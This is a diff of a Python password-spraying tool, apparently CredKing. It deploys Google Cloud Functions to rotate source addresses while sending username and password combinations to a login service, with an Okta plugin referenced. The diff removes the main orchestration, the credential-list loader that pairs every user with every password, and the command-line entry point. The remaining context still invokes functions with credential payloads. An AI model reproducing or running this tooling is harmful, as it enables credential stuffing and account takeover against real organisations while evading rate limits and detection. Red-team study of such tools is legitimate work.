@@ -14,81 +14,6 @@ _service_account_email = ""
 credentials = {'accounts': []}
 
 lock = Lock()
-q = queue.Queue()
-
-
-def main(args, pargs):
-    global start_time, end_time, time_lapse
-
-    thread_count = args.threads
-    plugin = args.plugin
-    username_file = args.userfile
-    password_file = args.passwordfile
-    sa_file = args.sa_creds_file
-    user_agent_file = args.useragentfile
-
-    pluginargs = {}
-    for i in range(0, len(pargs) - 1):
-        key = pargs[i].replace("--", "")
-        pluginargs[key] = pargs[i + 1]
-
-    start_time = datetime.datetime.utcnow()
-    log_entry('Execution started at: {}'.format(start_time))
-
-    # Prepare credential combinations into the queue
-    load_credentials(username_file, password_file, user_agent_file)
-
-    # Check with plugin to make sure it has the data that it needs
-    validator = importlib.import_module('plugins.{}'.format(plugin))
-    if getattr(validator, "validate", None) is not None:
-        valid, errormsg = validator.validate(pluginargs)
-        if not valid:
-            log_entry(errormsg)
-            return
-    else:
-        log_entry("No validate function found for plugin: {}".format(plugin))
-
-    sa_credentials = service_account.Credentials.from_service_account_file(sa_file)
-    # TODO: Evaluate if this variable is needed
-    global _service_account_email
-    _service_account_email = sa_credentials.service_account_email
-
-    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
-    storage_service = build('storage', 'v1', credentials=sa_credentials)
-
-    # Uploading Code
-
-    # Creating a bucket
-    bucket_name = f"credking_{next(generate_random())}"
-    body = {'name': bucket_name}
-    log_entry(storage_service.buckets().insert(project=sa_credentials.project_id, predefinedAcl="projectPrivate",
-                                               body=body).execute())
-
-    # Uploading a file from a created bucket
-    storage_client = storage.Client(project=sa_credentials.project_id, credentials=sa_credentials)
-    bucket = storage_client.bucket(bucket_name)
-    source_url = create_bucket(bucket, 'okta')
-
-    locations = service.projects().locations()
-    functions = create_functions(sa_credentials, locations, sa_credentials.project_id, source_url, thread_count)
-
-    for x in functions:
-        check_function(locations.functions(), x)
-
-    with ThreadPoolExecutor(max_workers=len(functions)) as executor:
-        for function_name in functions:
-            log_entry('Launching spray using {}...'.format(function_name))
-            executor.submit(
-                start_spray,
-                sa_credentials=sa_credentials,
-                function_name=function_name,
-                args=pluginargs
-            )
-
-    for function_name in functions:
-        delete_function(locations.functions(), function_name)
-    delete_bucket(bucket)
-    delete_zip()
 
 
 def clear_credentials(username, password):
@@ -115,55 +40,6 @@ def start_spray(sa_credentials, function_name, args, item):
     payload['args'] = args
     body = {"data": json.dumps(payload)}
     invoke_function(function, function_name, body)
-
-'''
-def start_spray(sa_credentials, function_name, args):
-    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
-    function = service.projects().locations().functions()
-    while True:
-        item = q.get_nowait()
-
-        if item is None:
-            break
-
-        payload = {}
-        payload['username'] = item['username']
-        payload['password'] = item['password']
-        payload['useragent'] = item['useragent']
-        payload['args'] = args
-        body = {"data": json.dumps(payload)}
-
-        invoke_function(function, function_name, body)
-
-        q.task_done()
-'''
-
-
-def load_credentials(user_file, password_file, useragent_file=None):
-    log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
-
-    users = load_file(user_file)
-    passwords = load_file(password_file)
-    if useragent_file is not None:
-        useragents = load_file(useragent_file)
-    else:
-        useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]
-
-    for user in users:
-        for password in passwords:
-            cred = {}
-            cred['username'] = user
-            cred['password'] = password
-            cred['useragent'] = random.choice(useragents)
-            credentials['accounts'].append(cred)
-
-    for cred in credentials['accounts']:
-        q.put(cred)
-
-
-def load_file(filename):
-    if filename:
-        return [line.strip() for line in open(filename, 'r')]
 
 
 def create_functions(sa_credentials, locations, project_id, source_url, thread_count):
@@ -305,27 +181,3 @@ def delete_zip():
     for f in file_list:
         os.remove(os.path.join('build', f))
         log_entry(f"Removing file {f}")
-
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    # Required Fields
-    parser.add_argument('--plugin', help='spraying plugin', required=True)
-    parser.add_argument('--threads', help='thread count (default: 1)',
-                        type=int, default=1)
-    parser.add_argument('--userfile', help='username file', required=True)
-    parser.add_argument('--passwordfile', help='password file', required=True)
-    parser.add_argument('--env', help="Serverless environments", required=True, action='append')
-
-    # Optional Fields
-    parser.add_argument('--useragentfile', help='useragent file', required=False)
-
-    # AWS Environment Required Fields
-    parser.add_argument('--access_key', help='aws access key', required=False)
-    parser.add_argument('--secret_access_key', help='aws secret access key', required=False)
-
-    # GCP Environment Required Fields
-    parser.add_argument('--sa_creds_file', help="GCP Json Keys", required=False)
-
-    args, plugin_args = parser.parse_known_args()
-    main(args, plugin_args)
